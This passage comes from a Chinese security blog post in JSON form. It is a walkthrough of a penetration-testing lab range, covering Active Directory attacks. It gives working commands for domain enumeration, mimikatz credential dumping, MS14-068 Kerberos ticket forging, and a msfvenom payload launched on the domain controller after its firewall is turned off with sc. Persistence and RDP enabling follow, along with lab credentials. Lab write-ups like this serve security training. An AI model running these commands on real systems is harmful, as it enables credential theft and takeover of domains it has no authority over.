class=\"token string double-quoted-string\">\"\"</span>    <span class=\"token comment\"># 与192.168.xx.xx建立空连接</span>\nnet <span class=\"token keyword\">use</span> \\\\<span class=\"token number\">192.168</span><span class=\"token operator\">.</span>xx<span class=\"token operator\">.</span><span class=\"token class-name class-name-fully-qualified type-declaration\">xx<span class=\"token punctuation\">\\</span>c</span>$ <span class=\"token string double-quoted-string\">\"密码\"</span> <span class=\"token operator\">/</span>user<span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"用户名\"</span>    <span class=\"token comment\"># 建立c盘共享</span>\ndir \\\\<span class=\"token number\">192.168</span><span class=\"token operator\">.</span>xx<span class=\"token operator\">.</span><span class=\"token class-name class-name-fully-qualified type-declaration\">xx<span class=\"token punctuation\">\\</span>c</span>$\\user    <span class=\"token comment\"># 查看192.168.xx.xx c盘user目录下的文件</span>\n\nnet config Workstation    <span class=\"token comment\"># 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span>\nnet user                 <span class=\"token comment\"># 查看本机用户列表</span>\nnet user <span class=\"token operator\">/</span>domain         <span class=\"token comment\"># 查看域用户</span>\nnet localgroup administrators    <span class=\"token comment\"># 查看本地管理员组（通常会有域用户）</span>\nnet view <span class=\"token operator\">/</span>domain         <span class=\"token comment\"># 查看有几个域</span>\nnet user 用户名 <span class=\"token operator\">/</span>domain   <span class=\"token comment\"># 获取指定域用户的信息</span>\nnet group <span class=\"token operator\">/</span>domain        <span class=\"token comment\"># 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span>\nnet group 组名 <span class=\"token operator\">/</span>domain    <span class=\"token comment\"># 查看域中某工作组</span>\nnet time <span class=\"token operator\">/</span>domain           <span class=\"token comment\">// 主域服务器会同时作为时间服务器</span>\nnet group <span class=\"token string double-quoted-string\">\"domain admins\"</span> <span class=\"token operator\">/</span>domain  <span class=\"token comment\"># 查看域管理员的名字</span>\nnet group <span class=\"token string double-quoted-string\">\"domain computers\"</span> <span class=\"token operator\">/</span>domain  <span class=\"token comment\"># 查看域中的其他主机名</span>\nnet group <span class=\"token string double-quoted-string\">\"doamin controllers\"</span> <span class=\"token operator\">/</span>domain  <span class=\"token comment\"># 查看域控制器（可能有多台）</span>\nnet group <span class=\"token string double-quoted-string\">\"Enterprise Admins\"</span> <span class=\"token operator\">/</span>domain    <span class=\"token comment\">// 查看域管理员组</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>接下来加载kiwi，并抓取用户凭据</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">#msf6中mimikatz已经不可以用了，mimikatz模块已经合并为kiwi模块</span>\nload kiwi <span class=\"token comment\">#加载kiwi模块</span>\ncreds_all <span class=\"token comment\">#列举所有凭据</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304120017258.png\" alt=\"image-20230412001734049\"></p>\n<p>接下来去执行mimikatz.exe抓取域控密码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token class-name static-context\">privilege</span><span class=\"token operator\">::</span><span class=\"token constant\">debug</span>\n<span class=\"token class-name static-context\">sekurlsa</span><span class=\"token operator\">::</span><span class=\"token constant\">logonpasswords</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>有密码后，尝试Ms14-068</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">https<span class=\"token punctuation\">:</span><span class=\"token comment\">//github.com/abatchy17/WindowsExploits/tree/master/MS14-068</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>而后通过msf上传到win7<strong>upload /tools/Ms14-068.exe C://users/douser</strong></p>\n<p>接下来利用它来伪造票据</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">MS14</span><span class=\"token operator\">-</span><span class=\"token number\">068.</span>exe <span class=\"token operator\">-</span>u 域成员名@域名 <span class=\"token operator\">-</span>s 域成员sid <span class=\"token operator\">-</span>d 域控制器地址 <span class=\"token operator\">-</span>p 域成员密码\n\n<span class=\"token constant\">MS14</span><span class=\"token operator\">-</span><span class=\"token number\">068.</span>exe <span class=\"token operator\">-</span>u douser@<span class=\"token constant\">DEMO</span><span class=\"token operator\">.</span><span class=\"token constant\">COM</span> <span class=\"token operator\">-</span>s <span class=\"token constant\">S</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">-</span><span class=\"token number\">5</span><span class=\"token operator\">-</span><span class=\"token number\">21</span><span class=\"token operator\">-</span><span class=\"token number\">979886063</span><span class=\"token operator\">-</span><span class=\"token number\">1111900045</span><span class=\"token operator\">-</span><span class=\"token number\">1414766810</span><span class=\"token operator\">-</span><span class=\"token number\">1107</span> <span class=\"token operator\">-</span>d <span class=\"token number\">192.168</span><span class=\"token number\">.183</span><span class=\"token number\">.130</span> <span class=\"token operator\">-</span>p Dotest123<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304120026031.png\" alt=\"image-20230412002613844\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304120050314.png\" alt=\"image-20230412005010143\"></p>\n<p>接下来将生成的<strong><a href=\"mailto:&#x54;&#71;&#84;&#x5f;&#x64;&#111;&#x75;&#115;&#101;&#x72;&#x40;&#100;&#101;&#109;&#111;&#46;&#x63;&#x6f;&#109;&#x2e;&#99;&#x63;&#x61;&#x63;&#104;&#101;\">&#x54;&#71;&#84;&#x5f;&#x64;&#111;&#x75;&#115;&#101;&#x72;&#x40;&#100;&#101;&#109;&#111;&#46;&#x63;&#x6f;&#109;&#x2e;&#99;&#x63;&#x61;&#x63;&#104;&#101;</a></strong>移到mimikatz目录下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">copy TGT_douser@demo<span class=\"token operator\">.</span>com<span class=\"token operator\">.</span>ccache <span class=\"token operator\">/</span>users<span class=\"token operator\">/</span>douser<span class=\"token operator\">/</span>desktop<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>然后mimikatz注入票据</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token class-name static-context\">kerberos</span><span class=\"token operator\">::</span><span class=\"token constant\">purge</span>         <span class=\"token comment\">//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span>\n<span class=\"token class-name static-context\">kerberos</span><span class=\"token operator\">::</span><span class=\"token constant\">list</span>          <span class=\"token comment\">//查看当前机器凭证</span>\n<span class=\"token class-name static-context\">kerberos</span><span class=\"token operator\">::</span><span class=\"token constant\">ptc</span> <span class=\"token operator\">&lt;</span>生成的票据文件<span class=\"token operator\">></span>   <span class=\"token comment\">//将票据注入到内存中</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>这里的话就是<strong>kerberos::ptc <a href=\"mailto:&#x54;&#71;&#x54;&#95;&#x64;&#111;&#117;&#x73;&#101;&#x72;&#x40;&#100;&#101;&#109;&#111;&#x2e;&#x63;&#111;&#x6d;&#46;&#99;&#x63;&#x61;&#99;&#x68;&#x65;\">&#x54;&#71;&#x54;&#95;&#x64;&#111;&#117;&#x73;&#101;&#x72;&#x40;&#100;&#101;&#109;&#111;&#x2e;&#x63;&#111;&#x6d;&#46;&#99;&#x63;&#x61;&#99;&#x68;&#x65;</a></strong></p>\n<p>接下来我们就成功的获取了域控权限，然后我们接下来只将一个msf木马上传至域控，关闭防火墙并执行木马文件即可实现msf上线</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">net use \\\\<span class=\"token constant\">WIN</span><span class=\"token operator\">-</span><span class=\"token constant\">ENS2VR5TR3N</span>\\c$  <span class=\"token comment\">//控制域成员与域控建立一个ipc链接</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>msf生成正向连接木马</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">msfvenom <span class=\"token operator\">-</span>p windows<span class=\"token operator\">/</span>x64<span class=\"token operator\">/</span>meterpreter<span class=\"token operator\">/</span>bind_tcp <span class=\"token constant\">LHOST</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span><span class=\"token number\">.183</span><span class=\"token number\">.130</span> <span class=\"token constant\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">7777</span> <span class=\"token operator\">-</span>f exe <span class=\"token operator\">></span> shell<span class=\"token operator\">.</span>exe<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>将shell.exe上传至Win7，然后上传至域控</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">copy shell<span class=\"token punctuation\">.</span>exe \\\\<span class=\"token constant\">WIN</span><span class=\"token operator\">-</span><span class=\"token constant\">ENS2VR5TR3N</span>\\c$<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>利用Sc关闭防火墙，并执行木马文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">sc \\\\<span class=\"token constant\">WIN</span><span class=\"token operator\">-</span><span class=\"token constant\">ENS2VR5TR3N</span> create ProFirewall binpath<span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"netsh advfirewall set allprofiles state off\"</span> \nsc \\\\<span class=\"token constant\">WIN</span><span class=\"token operator\">-</span><span class=\"token constant\">ENS2VR5TR3N</span> start ProFirewall \nsc \\\\<span class=\"token constant\">WIN</span><span class=\"token operator\">-</span><span class=\"token constant\">ENS2VR5TR3N</span> create Startup binpath<span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"C:\\shell.exe\"</span> \nsc \\\\<span class=\"token constant\">WIN</span><span class=\"token operator\">-</span><span class=\"token constant\">ENS2VR5TR3N</span> start Startup<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>同时msf进行监听（监听一定在木马执行之前）</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">use</span> <span class=\"token package\">exploit</span><span class=\"token operator\">/</span>multi<span class=\"token operator\">/</span>handler\nset payload windows<span class=\"token operator\">/</span>x64<span class=\"token operator\">/</span>meterpreter<span class=\"token operator\">/</span>bind_tcp\nset <span class=\"token constant\">RHOST</span> <span class=\"token number\">192.168</span><span class=\"token number\">.183</span><span class=\"token number\">.130</span>\nset <span class=\"token constant\">LPORT</span> <span class=\"token number\">7777</span>\nexploit<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>而后成功上线，接管域控</p>\n<p>接下来执行</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">run persistence <span class=\"token operator\">-</span><span class=\"token constant\">X</span> <span class=\"token operator\">-</span>i <span class=\"token number\">5</span> <span class=\"token operator\">-</span>p <span class=\"token number\">4000</span> <span class=\"token operator\">-</span><span class=\"token constant\">P</span> windows<span class=\"token operator\">/</span>meterpreter<span class=\"token operator\">/</span>bind_tcp<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>而后上传<strong>mimikatz.exe</strong>,抓取密码</p>\n<p>得到密码后，开启3389（远程桌面登录服务）</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">run post<span class=\"token operator\">/</span>windows<span class=\"token operator\">/</span>manage<span class=\"token operator\">/</span>enable_rdp<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>账密如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">DEMO</span>\\administrator\n<span class=\"token operator\">!</span>QAZ2wsx<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>而后成功登录，即可实现远控域控</p>\n<h1 id=\"Referer\"><a href=\"#Referer\" class=\"headerlink\" title=\"Referer\"></a>Referer</h1><p><a href=\"https://blog.csdn.net/zy15667076526/article/details/116059592\">https://blog.csdn.net/zy15667076526/article/details/116059592</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/340783.html\">https://www.freebuf.com/articles/web/340783.html</a></p>\n<p><a href=\"https://cloud.tencent.com/developer/article/2236315\">https://cloud.tencent.com/developer/article/2236315</a></p>\n<p><a href=\"https://www.viewofthai.link/2022/08/29/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95%EF%BC%88%E4%B8%8A%EF%BC%89/\">https://www.viewofthai.link/2022/08/29/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95%EF%BC%88%E4%B8%8A%EF%BC%89/</a></p>\n","feature":true,"text":"环境搭建环境地址如下： http://39.98.79.56/vuln/detail/6/ 接下来下载好后在VmWare中进行ovf导入即可，共计三个文件 接下来配置网络环境，在虚拟网络编辑器中添加两个网段 1、192.168.1.0 NAT模式 用于外网 2、192.168.1...","link":"","photos":[],"count_time":{"symbolsCount":"14k","symbolsTime":"13 mins."},"categories":[{"name":"内网","slug":"内网","count":12,"path":"api/categories/内网.json"}],"tags":[{"name":"内网","slug":"内网","count":13,"path":"api/tags/内网.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA\"><span class=\"toc-text\">环境搭建</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9\"><span class=\"toc-text\">外网打点</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#PHPMyadmin\"><span class=\"toc-text\">PHPMyadmin</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Tomcat-getshell\"><span class=\"toc-text\">Tomcat getshell</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Struts2\"><span class=\"toc-text\">Struts2</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Msf%E4%B8%8A%E7%BA%BF\"><span class=\"toc-text\">Msf上线</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%BA%8C\"><span class=\"toc-text\">方法二</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Docker%E9%80%83%E9%80%B8\"><span class=\"toc-text\">Docker逃逸</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#CVE-2019-5736\"><span class=\"toc-text\">CVE-2019-5736</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E9%80%83%E9%80%B8\"><span class=\"toc-text\">特权模式逃逸</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%86%85%E7%BD%91\"><span class=\"toc-text\">内网</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86\"><span class=\"toc-text\">信息搜集</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#msf%E4%B8%8A%E7%BA%BF\"><span class=\"toc-text\">msf上线</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1\"><span class=\"toc-text\">添加路由</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86\"><span class=\"toc-text\">设置代理</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8\"><span class=\"toc-text\">横向移动</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Referer\"><span class=\"toc-text\">Referer</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Spring boot 从0到0.1 part(1)","uid":"ae530cf0e291102adbee6321d7a17ef6","slug":"Spring boot 从0到0.1","date":"2023-04-17T09:54:30.000Z","updated":"2023-04-26T19:05:30.000Z","comments":true,"path":"api/articles/Spring boot 从0到0.1.json","keywords":null,"cover":"https://images7.alphacoders.com/131/thumbbig-1310789.webp","text":"Day 01第一个Spring boot项目首先新建项目，选择Spring Initializr 随便填一下包名，选版本号后点击Next即可 开启Spring Web服务。 这里需要注意一点，去修改Spring boot版本，使其小于3.0.5(如果其他配置与我前面配置一致的话)...","link":"","photos":[],"count_time":{"symbolsCount":"42k","symbolsTime":"38 mins."},"categories":[{"name":"JAVA","slug":"JAVA","count":10,"path":"api/categories/JAVA.json"}],"tags":[{"name":"语言学习","slug":"语言学习","count":3,"path":"api/tags/语言学习.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"PHP 常见内置类浅析","uid":"66ce77a9cc55d19533b30410eadbc5d9","slug":"PHP常见内置类浅析","date":"2023-04-07T18:36:20.000Z","updated":"2023-04-23T01:50:38.000Z","comments":true,"path":"api/articles/PHP常见内置类浅析.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141530896.png","text":"前言周末看题，遇PHP原生类，坐牢，此前未学，故学，浅结，如下。 PHP原生类基础概念什么是原生类呢，接下来来简单介绍一下它。 PHP原生类就是在标准PHP库中已经封装好的类，而在其中，有些类具有一些功能，例如文件读取、目录遍历等，这就给了我们可乘之机，我们只需要实例化这些类，就...","link":"","photos":[],"count_time":{"symbolsCount":"21k","symbolsTime":"19 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"反序列化","slug":"反序列化","count":4,"path":"api/tags/反序列化.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}